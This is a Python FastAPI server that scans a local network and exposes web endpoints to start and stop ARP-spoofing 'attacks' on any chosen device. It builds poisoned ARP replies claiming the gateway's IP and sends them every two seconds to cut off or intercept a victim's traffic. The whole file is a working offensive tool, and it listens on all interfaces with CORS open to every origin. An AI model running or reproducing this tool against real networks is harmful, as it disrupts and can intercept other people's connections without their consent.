from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import scapy.all as scapy
from mac_vendor_lookup import MacLookup
import threading
import time
import os
import sys

import uvicorn

app = FastAPI()

# --- Configurations ---
# Initialize MacLookup (handling potential errors if offline)
try:
    mac_lookup = MacLookup()
except:
    mac_lookup = None

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- Global State ---
active_attacks = {}

# --- Models ---
class AttackRequest(BaseModel):
    target_ip: str

# --- Helpers ---
def get_mac(ip):
    """Returns MAC address for a given IP."""
    # We send an ARP request to ask "Who has this IP?"
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    
    # Send and wait for response
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def get_gateway_ip():
    """Auto-detect the Gateway IP (Router)."""
    try:
        # Scapy internal route table lookup
        # conf.route.route returns (interface, output_ip, gateway_ip)
        return scapy.conf.route.route("8.8.8.8")[2]
    except:
        return "192.168.1.1" # Fallback

def arp_spoof_loop(target_ip, gateway_ip, stop_event):
    """
    The actual attack logic running in a separate thread.
    """
    # 1. Get the MAC address of the Target (Victim)
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"❌ Error: Could not find MAC for {target_ip}. Aborting.")
        return

    print(f"🚀 Starting Kill Switch on {target_ip} ({target_mac})...")
    
    # 2. Build the malicious packet ONCE (Efficiency)
    # We tell the Target: "I have the Gateway's IP"
    # Ether layer: Send specifically to target_mac (Unicast) - FIXES THE WARNING
    # ARP layer: op=2 (is-at), psrc=GatewayIP (Spoofed), hwdst=TargetMAC
    poison_packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    
    while not stop_event.is_set():
        # 3. Send the packet at Layer 2 (sendp) instead of Layer 3 (send)
        scapy.sendp(poison_packet, verbose=False)
        time.sleep(2)
    
    # --- Recovery Phase ---
    print(f"🛑 Stopping attack on {target_ip}. Restoring network...")
    
    # To restore, we need the REAL Gateway MAC
    gateway_mac = get_mac(gateway_ip)
    if gateway_mac:
        # Create a "healing" packet: Tell target the REAL mac of the gateway
        restore_packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
        scapy.sendp(restore_packet, count=5, verbose=False)
    else:
        print("⚠️ Could not find Gateway MAC to restore network properly.")

# --- Startup ---
@app.on_event("startup")
async def startup_event():
    try:
        if mac_lookup:
            mac_lookup.update_vendors()
            print("✅ MAC Vendor DB Updated.")
    except:
        print("⚠️ Could not update MAC Vendor DB.")

# --- Routes ---

@app.get("/api/scan")
def get_network_scan():
    # Detect own local IP range mostly correct for home networks
    target_ip = "192.168.1.1/24" 
    
    try:
        arp_request = scapy.ARP(pdst=target_ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        answered_list = scapy.srp(broadcast/arp_request, timeout=1, verbose=False)[0]

        clients_list = []
        for element in answered_list:
            ip = element[1].psrc
            mac = element[1].hwsrc
            
            try:
                # Private MAC detection logic
                first_octet = int(mac.split(":")[0], 16)
                is_private = (first_octet & 0b00000010) != 0
                
                if is_private:
                    vendor = "Private Device (Randomized)"
                elif mac_lookup:
                    vendor = mac_lookup.lookup(mac)
                else:
                    vendor = "Unknown"
            except:
                vendor = "Unknown"

            is_attacked = ip in active_attacks

            clients_list.append({
                "ip": ip, 
                "mac": mac, 
                "vendor": vendor,
                "is_attacked": is_attacked
            })
            
        return {"status": "success", "devices": clients_list}
    except Exception as e:
        print(f"Scan error: {e}")
        return {"status": "error", "message": str(e), "devices": []}

@app.post("/api/attack/start")
def start_attack(request: AttackRequest):
    ip = request.target_ip
    
    if ip in active_attacks:
        return {"status": "already_attacking", "message": f"Already attacking {ip}"}

    gateway_ip = get_gateway_ip()
    print(f"DEBUG: Gateway IP detected as {gateway_ip}")
    
    stop_event = threading.Event()
    active_attacks[ip] = stop_event
    
    t = threading.Thread(target=arp_spoof_loop, args=(ip, gateway_ip, stop_event))
    t.daemon = True
    t.start()
    
    return {"status": "started", "target": ip}

@app.post("/api/attack/stop")
def stop_attack(request: AttackRequest):
    ip = request.target_ip
    
    if ip in active_attacks:
        active_attacks[ip].set() # Signal thread to stop
        del active_attacks[ip]
        return {"status": "stopped", "target": ip}
    
    return {"status": "error", "message": "No active attack found on this IP"}

if __name__ == "__main__":
    # Ensure we run with admin rights check could be here, but usually managed by user
    uvicorn.run(app, host="0.0.0.0", port=8000)